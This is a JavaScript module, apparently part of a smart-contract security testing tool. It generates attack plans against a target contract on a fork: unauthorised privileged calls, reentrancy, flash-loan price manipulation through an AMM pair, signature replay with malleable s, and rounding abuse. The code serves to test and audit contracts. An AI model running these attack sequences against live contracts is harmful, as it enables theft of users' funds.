// The red team's strategy library (docs/future/red-team.md). Each strategy reads the target's ABI and the
// fork, and proposes attack plans (src/redteam/engine.js); the engine runs every plan on the fork and keeps the
// ones that make the target lose its asset or break an invariant. Deterministic: no clock, no randomness (the
// random search is src/redteam/search.js, seeded).
//
//   access-control   privileged-looking functions called by a stranger, alone and followed by a payout
//   reentrancy       deposit, then a payout whose callback re-enters the payout (1..15 times)
//   flash-price      flash-borrow a token, swap it through the AMM pair the target prices from (spot price moves),
//                    call the target with everything bought, repay the loan (oracle / price manipulation)
//   signature-replay re-send a signed call seen in the target's history: as is, for the attacker, malleable s
//   rounding         a small amount many times in one transaction (rounding that burns 0 shares / pays 1 extra)
import { AbiCoder, Interface, MaxUint256, ZeroHash, keccak256, toUtf8Bytes, getAddress } from 'ethers';

const abi = AbiCoder.defaultAbiCoder();
const ERC20 = new Interface(['function transfer(address,uint256) returns (bool)', 'function approve(address,uint256) returns (bool)', 'function balanceOf(address) view returns (uint256)']);
const PAIR = new Interface(['function getReserves() view returns (uint112, uint112, uint32)', 'function token0() view returns (address)', 'function swap(uint256,uint256,address,bytes)']);
const LENDER = new Interface(['function flashLoan(address,address,uint256,bytes) returns (bool)']);
const SECP_N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141n;
const ERC3156_OK = keccak256(toUtf8Bytes('ERC3156FlashBorrower.onFlashLoan'));
const lower = (a) => getAddress(a).toLowerCase();

const PRIVILEGED = /owner|admin|init|setup|grant|role|auth|upgrade|guardian|operator|manager|config|set[A-Z_]/;
const PAYOUT = /withdraw|sweep|drain|rescue|claim|skim|redeem|exit|emergency|collect|payout|harvest|release|unstake|burn|sell|borrow/i;
const DEPOSIT = /deposit|stake|mint|supply|lock|join|fund|save/i;

/** The state-changing functions of the target's ABI. */
export const mutating = (iface) => iface.fragments.filter((f) => f.type === 'function' && f.stateMutability !== 'view' && f.stateMutability !== 'pure');

/** Values tried for a parameter type (who: the address a "recipient" should be: the attacker EOA or its contract). */
export function valuesFor(type, ctx, who, amounts) {
  if (type === 'address') return [who, ctx.attacker, ctx.attackerContract, ctx.target.address];
  const m = /^(u?)int(\d*)$/.exec(type);
  if (m) {
    const bits = BigInt(m[2] || 256) - (m[1] ? 0n : 1n);
    const fit = amounts.filter((a) => a >= 0n && a < (1n << bits));
    return fit.length ? fit : [0n, 1n];
  }
  if (type === 'bool') return [true, false];
  if (type === 'bytes32') return [ZeroHash];
  if (/^bytes\d+$/.test(type)) return ['0x' + '00'.repeat(Number(type.slice(5)))];
  if (type === 'bytes' || type === 'string') return [type === 'bytes' ? '0x' : ''];
  if (type.endsWith('[]')) return [[]];
  return null; // tuples / fixed arrays: not generated
}

/** Up to `max` argument tuples: the first value of each type, then each uint parameter through the amounts. */
export function argTuples(fn, ctx, who, amounts, max = 8) {
  const per = fn.inputs.map((p) => valuesFor(p.type, ctx, who, amounts));
  if (per.some((v) => v == null)) return [];
  const base = per.map((v) => v[0]);
  const out = [base];
  const key = (t) => JSON.stringify(t, (_k, v) => (typeof v === 'bigint' ? v.toString() : v));
  const seen = new Set([key(base)]);
  for (let i = 0; i < per.length && out.length < max; i++) {
    for (const v of per[i].slice(1)) {
      const t = base.slice(); t[i] = v;
      if (!seen.has(key(t))) { seen.add(key(t)); out.push(t); }
      if (out.length >= max) break;
    }
  }
  return out;
}

/** The amounts tried: the target's balance and fractions of it, round numbers, the extremes. */
export async function amountsOf(ctx) {
  const bal = await ctx.world.balance(ctx.target.address);
  const out = [bal, bal / 2n, bal / 4n, 10n ** 18n, 1n, 0n, MaxUint256];
  return [...new Set(out.map(String))].map(BigInt);
}

const enc = (iface, fn, args) => iface.encodeFunctionData(fn, args);

// ------------------------------------------------------------------------------------------- strategies

export const accessControl = {
  id: 'access-control',
  title: 'privileged functions open to anyone',
  async *plans(ctx) {
    const iface = ctx.target.iface;
    const fns = mutating(iface).filter((f) => f.stateMutability !== 'payable' || f.inputs.length);
    const amounts = await amountsOf(ctx);
    const to = ctx.target.address;
    for (const f of fns) for (const a of argTuples(f, ctx, ctx.attacker, amounts, 6)) {
      yield { strategy: this.id, title: `${f.name}(…) by a stranger`, steps: [{ eoa: { to, data: enc(iface, f, a) } }] };
    }
    const priv = fns.filter((f) => PRIVILEGED.test(f.name) || f.inputs.length === 0);
    const pay = fns.filter((f) => PAYOUT.test(f.name));
    for (const p of priv) for (const pa of argTuples(p, ctx, ctx.attacker, amounts, 3)) for (const w of pay) {
      if (w === p) continue;
      for (const wa of argTuples(w, ctx, ctx.attacker, amounts, 4)) {
        yield { strategy: this.id, title: `${p.name}(…) then ${w.name}(…)`, steps: [{ eoa: { to, data: enc(iface, p, pa) } }, { eoa: { to, data: enc(iface, w, wa) } }] };
      }
    }
  },
};

export const reentrancy = {
  id: 'reentrancy',
  title: 'a payout re-entered from its own callback',
  async *plans(ctx) {
    const iface = ctx.target.iface;
    const fns = mutating(iface);
    const deposits = fns.filter((f) => f.stateMutability === 'payable');
    const payouts = fns.filter((f) => f.stateMutability !== 'payable' && f.inputs.length <= 1 && f.inputs.every((p) => /^uint/.test(p.type)) && PAYOUT.test(f.name));
    const bal = await ctx.world.balance(ctx.target.address);
    const cap = ctx.funding / 2n;
    const amts = [bal / 4n, bal / 8n, 10n ** 18n].map((a) => (a > cap ? cap : a)).filter((a) => a > 0n);
    for (const d of deposits) for (const w of payouts) for (const amt of [...new Set(amts.map(String))].map(BigInt)) for (const times of [1, 3, 7, 15]) {
      const dArgs = argTuples(d, ctx, ctx.attackerContract, [amt])[0];
      const wArgs = w.inputs.length ? [amt] : [];
      if (!dArgs) continue;
      const wCall = { to: ctx.target.address, data: enc(iface, w, wArgs) };
      yield {
        strategy: this.id, title: `${d.name}{${amt}} then ${w.name}() re-entered ${times}x`,
        steps: [{ contract: { value: amt, callback: { calls: [wCall], times, ret: '0x' },
          calls: [{ to: ctx.target.address, value: amt, data: enc(iface, d, dArgs) }, wCall] } }],
      };
    }
  },
};

/** amountOut of a constant-product pair with a 0.3% fee (ZetaphyPair / Uniswap V2). */
export const amountOut = (amountIn, rIn, rOut) => (amountIn * 997n * rOut) / (rIn * 1000n + amountIn * 997n);

export const flashPrice = {
  id: 'flash-price',
  title: 'flash loan + spot-price manipulation through an AMM pair',
  async *plans(ctx) {
    const { world, target } = ctx;
    const pairs = target.env?.pairs ?? [];
    const lenders = target.env?.lenders ?? [];
    const iface = target.iface;
    const fns = mutating(iface).filter((f) => f.inputs.length === 1 && /^uint/.test(f.inputs[0].type));
    for (const L of lenders) for (const T of L.tokens ?? []) for (const P of pairs) {
      const t0 = lower(P.token0), t1 = lower(P.token1), tk = lower(T);
      if (tk !== t0 && tk !== t1) continue;
      const U = tk === t0 ? t1 : t0;
      const res = await world.call(P.address, PAIR.encodeFunctionData('getReserves'));
      if (!res) continue;
      const [r0, r1] = PAIR.decodeFunctionResult('getReserves', res);
      const [rIn, rOut] = tk === t0 ? [r0, r1] : [r1, r0];
      const lb = await world.call(T, ERC20.encodeFunctionData('balanceOf', [L.address]));
      const lent = lb ? BigInt(ERC20.decodeFunctionResult('balanceOf', lb)[0]) : 0n;
      const R = BigInt(rIn);
      const loans = [...new Set([R / 2n, R, 2n * R, lent * 9n / 10n].filter((x) => x > 0n && x <= lent).map(String))].map(BigInt);
      for (const loan of loans) {
        const out = amountOut(loan, R, BigInt(rOut)) - 1n;
        if (out <= 0n) continue;
        const [o0, o1] = tk === t0 ? [0n, out] : [out, 0n];
        // after the pump the pair holds (R + loan, rOut - out); the bought tokens left after the target call go back
        const rT2 = R + loan, rU2 = BigInt(rOut) - out;
        for (const f of fns) for (let k = 0n; k <= 6n; k++) {
          const sold = out >> k;                    // all, half, a quarter, … of what was bought
          const left = out - sold;
          const back = left > 0n ? amountOut(left, rU2, rT2) - 1n : 0n;
          const [b0, b1] = tk === t0 ? [back, 0n] : [0n, back];
          const calls = [
            { to: T, data: ERC20.encodeFunctionData('transfer', [P.address, loan]) },
            { to: P.address, data: PAIR.encodeFunctionData('swap', [o0, o1, ctx.attackerContract, '0x']) },
            { to: U, data: ERC20.encodeFunctionData('approve', [target.address, MaxUint256]) },
            { to: target.address, data: enc(iface, f, [sold]) },
            ...(back > 0n ? [
              { to: U, data: ERC20.encodeFunctionData('transfer', [P.address, left]) },
              { to: P.address, data: PAIR.encodeFunctionData('swap', [b0, b1, ctx.attackerContract, '0x']) },
            ] : []),
            { to: T, data: ERC20.encodeFunctionData('approve', [L.address, MaxUint256]) },
          ];
          yield {
            strategy: this.id, title: `flash-borrow ${loan} of ${tk}, pump the pair, ${f.name}(${sold}), swap the rest back, repay`,
            steps: [{ contract: { callback: { calls, times: 1, ret: abi.encode(['bytes32'], [ERC3156_OK]) },
              calls: [{ to: L.address, data: LENDER.encodeFunctionData('flashLoan', [ctx.attackerContract, T, loan, '0x']) }] } }],
          };
        }
      }
    }
  },
};

export const signatureReplay = {
  id: 'signature-replay',
  title: 'a signed call re-sent (no nonce / recipient binding / malleable s)',
  async *plans(ctx) {
    const iface = ctx.target.iface;
    for (const h of ctx.target.history ?? []) {
      if (lower(h.to) !== ctx.target.address) continue;
      let parsed;
      try { parsed = iface.parseTransaction({ data: h.data, value: BigInt(h.value ?? 0) }); } catch { continue; }
      if (!parsed) continue;
      const types = parsed.fragment.inputs.map((p) => p.type);
      const vIdx = types.findIndex((t, i) => t === 'uint8' && types[i + 1] === 'bytes32' && types[i + 2] === 'bytes32');
      const bIdx = types.findIndex((t, i) => t === 'bytes' && String(parsed.args[i]).length === 132);
      if (vIdx < 0 && bIdx < 0) continue;
      const args = [...parsed.args];
      const variants = [{ why: 'as is', args }];
      const swapped = args.map((a, i) => (types[i] === 'address' && h.from && lower(String(a)) === lower(h.from) ? ctx.attacker : a));
      variants.push({ why: 'recipient = attacker', args: swapped });
      if (vIdx >= 0) {
        const m = args.slice();
        m[vIdx] = Number(args[vIdx]) === 27 ? 28 : 27;
        m[vIdx + 2] = '0x' + (SECP_N - BigInt(args[vIdx + 2])).toString(16).padStart(64, '0');
        variants.push({ why: 'malleable s', args: m });
      }
      for (const v of variants) {
        yield { strategy: this.id, title: `replay ${parsed.name}(…) ${v.why}`, steps: [{ eoa: { to: ctx.target.address, data: enc(iface, parsed.fragment, v.args), value: BigInt(h.value ?? 0) } }] };
      }
    }
  },
};

export const rounding = {
  id: 'rounding',
  title: 'one small amount, many times (rounding in the attacker\'s favour)',
  async *plans(ctx) {
    const iface = ctx.target.iface;
    const fns = mutating(iface).filter((f) => f.stateMutability !== 'payable' && f.inputs.length === 1 && /^uint/.test(f.inputs[0].type) && PAYOUT.test(f.name));
    const bal = await ctx.world.balance(ctx.target.address);
    const xs = [];
    for (let k = 0; k <= 18; k += 1) xs.push(10n ** BigInt(k));
    for (let d = 2n; d <= 1n << 16n; d *= 4n) xs.push(bal / d);
    const N = 32;
    for (const f of fns) for (const x of [...new Set(xs.filter((v) => v > 0n).map(String))].map(BigInt)) {
      const call = { to: ctx.target.address, data: enc(iface, f, [x]) };
      yield { strategy: this.id, title: `${f.name}(${x}) x${N}`, steps: [{ contract: { calls: Array(N).fill(call) } }] };
    }
  },
};

export const STRATEGIES = [accessControl, reentrancy, flashPrice, signatureReplay, rounding];
export const strategyById = (id) => STRATEGIES.find((s) => s.id === id);
export { DEPOSIT };
